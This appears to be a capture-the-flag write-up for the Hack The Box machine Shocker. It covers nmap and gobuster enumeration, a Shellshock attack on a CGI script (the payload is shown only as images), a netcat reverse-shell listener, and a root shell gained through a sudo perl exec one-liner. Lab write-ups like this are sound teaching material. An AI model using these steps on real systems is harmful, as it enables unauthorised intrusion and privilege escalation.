nmap scan:

```
sudo nmap -sV -sC 10.10.10.56
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerating port 80

We have this website:

![image1](/assets/images/htb-shocker/shocker1.png)

Using gobuster to find hidden directories:

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.56 -t 50
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/server-status (Status: 403)
```

Let's try to find files on `/cgi-bin/`:

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.56/cgi-bin -t 50 -x sh,pl
/user.sh (Status: 200)
```

`/user.sh`:

![image2](/assets/images/htb-shocker/shocker2.png)

It's a bash script that displays the hour

Now let's send this request to burp and then to the repeater

![image3](/assets/images/htb-shocker/shocker3.png)

### Testing if it's vulnerable to shellshock

The name of the box is a hint to try shellshock:

![image4](/assets/images/htb-shocker/shocker4.png)

It is vulnerable, we listed files.

### Exploiting shellshock to get a reverse shell

![image5](/assets/images/htb-shocker/shocker5.png)

```
nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.56 35622
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

### Privilege Escalation

```
sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can execute perl as root, so execute `/bin/sh`

```
sudo perl -e 'exec "/bin/sh";' 
```
